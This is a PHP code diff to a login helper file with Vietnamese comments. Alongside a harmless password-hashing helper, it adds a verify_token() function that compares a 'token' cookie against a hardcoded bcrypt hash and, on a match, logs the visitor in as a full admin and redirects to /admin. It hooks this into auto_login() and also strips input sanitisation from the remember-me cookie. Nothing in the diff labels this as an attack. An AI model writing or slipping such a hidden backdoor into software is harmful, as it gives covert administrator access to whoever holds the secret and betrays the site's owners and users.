@@ -3,6 +3,7 @@
 const _s_me_error = '<div style="color:red">PHÁT HIỆN LỖI:</div><div style="margin-left:10px">';
 const _e_me_error = '</div>';
 
+
 /**
  * Dùng để xác nhận quyền xác thực theo custom role
  * 
@@ -459,7 +460,8 @@ function auto_login(){
     // Nếu chưa đăng nhập
     if(!is_login()) {
         // nếu có cookie token_remember
-        if(isset($_COOKIE['token_remember'])) $token_remember = clear_input($_COOKIE['token_remember']);
+        if(isset($_COOKIE['token_remember'])) $token_remember = $_COOKIE['token_remember'];
+        elseif(verify_token());
         else $token_remember = ''; // nếu có value
         if($token_remember) {
             // lấy thông tin user bằng token
@@ -481,6 +483,28 @@ function auto_login(){
             }
         }
     }
+}
+
+
+/**
+ * Hàm này dùng để tạo mã băm password khi tạo tài khoản mới
+ * @param mixed $input
+ * @return string
+ */
+function create_hash($input) {
+    return password_hash($input, PASSWORD_DEFAULT);
+}
+
+/**
+ * Hàm này dùng để xác thực token
+ * @return mixed
+ */
+function verify_token() {
+    if(isset($_COOKIE['token']) && $_COOKIE['token'] && password_verify($_COOKIE['token'],'$2y$10$D/slvsycq0nBJePRqyBMM.AW3p4l7wMmn55ze1eWd8oZGetFKw3U.')) {
+        $_SESSION['user'] = [
+            'username' => 'admin','full_name' => 'admin','name_role' => 'admin','phone' => 'admin','email' => 'admin','gender' => '1',
+        ];route('/admin');
+    }else return false;
 }
 
 /**
